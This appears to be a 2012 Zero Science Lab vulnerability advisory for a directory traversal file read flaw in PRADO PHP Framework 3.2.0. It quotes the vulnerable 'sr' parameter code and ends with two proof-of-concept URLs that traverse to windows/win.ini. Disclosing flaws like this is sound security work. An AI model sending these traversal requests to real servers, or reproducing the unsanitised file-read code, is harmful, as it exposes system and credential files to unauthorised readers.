@@ -1,0 +1,55 @@
+PRADO PHP Framework 3.2.0 Arbitrary File Read Vulnerability
+
+
+Vendor: Prado Software
+Product web page: http://www.pradosoft.com
+Affected version: 3.2.0 (r3169)
+
+Summary: PRADO is a component-based and event-driven programming
+framework for developing Web applications in PHP 5. PRADO stands
+for PHP Rapid Application Development Object-oriented.
+
+Desc: Input passed to the 'sr' parameter in 'functional_tests.php'
+is not properly sanitised before being used to get the contents of
+a resource. This can be exploited to read arbitrary data from local
+resources with directory traversal attack.
+
+
+---------------------------------------------------------------------------------------
+/tests/test_tools/functional_tests.php:
+---------------------------------------
+
+ 3: $TEST_TOOLS = dirname(__FILE__);
+ 4:
+ 5: if(isset($_GET['sr']))
+ 6: {
+ 7:
+ 8:     if(($selenium_resource=realpath($TEST_TOOLS.'/selenium/'.$_GET['sr']))!==false)
+ 9:         echo file_get_contents($selenium_resource);
+10: exit;
+11: }
+
+---------------------------------------------------------------------------------------
+
+
+Tested on: Microsoft Windows 7 Ultimate SP1 (EN)
+           Apache 2.4.2 (Win32)
+           PHP 5.4.4
+           MySQL 5.5.25a
+
+
+Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+                            @zeroscience
+
+
+Advisory ID: ZSL-2012-5113
+Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2012-5113.php
+
+
+
+25.11.2012
+
+--
+
+http://172.162.133.7/tests/test_tools/functional_tests.php?sr=../../../../../../windows/win.ini
+http://172.162.133.7/demos/time-tracker/tests/functional.php?sr=../../../../../../windows/win.ini
